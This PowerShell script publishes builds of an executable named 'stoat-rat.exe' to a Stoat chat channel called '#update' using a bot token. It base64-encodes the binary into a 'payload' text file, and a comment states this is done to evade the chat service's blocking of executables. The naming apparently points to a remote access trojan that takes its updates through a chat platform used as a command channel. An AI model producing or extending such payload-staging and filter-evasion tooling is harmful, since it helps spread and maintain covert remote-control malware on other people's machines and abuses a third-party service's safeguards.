# language: PowerShell, file: publish-update.ps1
# Publish a build to the Stoat #update channel as a base64 text attachment
# (Stoat's file server blocks executables/archives by MIME).
#
#   .\publish-update.ps1                       # publishes .\target\release\stoat-rat.exe
#   .\publish-update.ps1 -Exe .\other.exe
#
# The bot token is read from .\agent.secret (or the STOAT_TOKEN env var) — never hardcoded here.
param(
    [string]$Exe = ".\target\release\stoat-rat.exe",
    [string]$Token = "",
    [string]$Channel = "01M3F6R1R214X5VXBWDCE5NHEQ"
)
$ErrorActionPreference = "Stop"

if (-not $Token) {
    $secret = Join-Path $PSScriptRoot "agent.secret"
    if ($env:STOAT_TOKEN) { $Token = $env:STOAT_TOKEN }
    elseif (Test-Path $secret) { $Token = (Get-Content $secret -Raw).Trim() }
    else { throw "no token: create agent.secret or set STOAT_TOKEN" }
}

if (-not (Test-Path $Exe)) { throw "no such file: $Exe" }
$exePath = (Resolve-Path $Exe).Path
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($exePath))
$tmp = Join-Path $env:TEMP ("payload-" + [guid]::NewGuid().ToString("N") + ".txt")
[IO.File]::WriteAllText($tmp, $b64, [Text.Encoding]::ASCII)

$upUrl = "https://cdn.stoatusercontent.com/attachments"
$up = curl.exe -s -X POST $upUrl -H "X-Bot-Token: $Token" -F "file=@$($tmp -replace '\\','/');filename=payload.txt" | ConvertFrom-Json
if (-not $up.id) { Remove-Item $tmp -Force; throw "upload failed: $($up | ConvertTo-Json -Compress)" }

$body = @{
    content     = "stoat-rat build $(Get-Date -Format 'yyyy-MM-dd HH:mm') ($([math]::Round((Get-Item $exePath).Length/1MB,2)) MB)"
    attachments = @($up.id)
} | ConvertTo-Json
$msg = Invoke-RestMethod "https://api.stoat.chat/channels/$Channel/messages" -Method Post `
    -Headers @{ "X-Bot-Token" = $Token } -ContentType "application/json" -Body $body
Remove-Item $tmp -Force
"published update: message $($msg._id)  ($($exePath))"
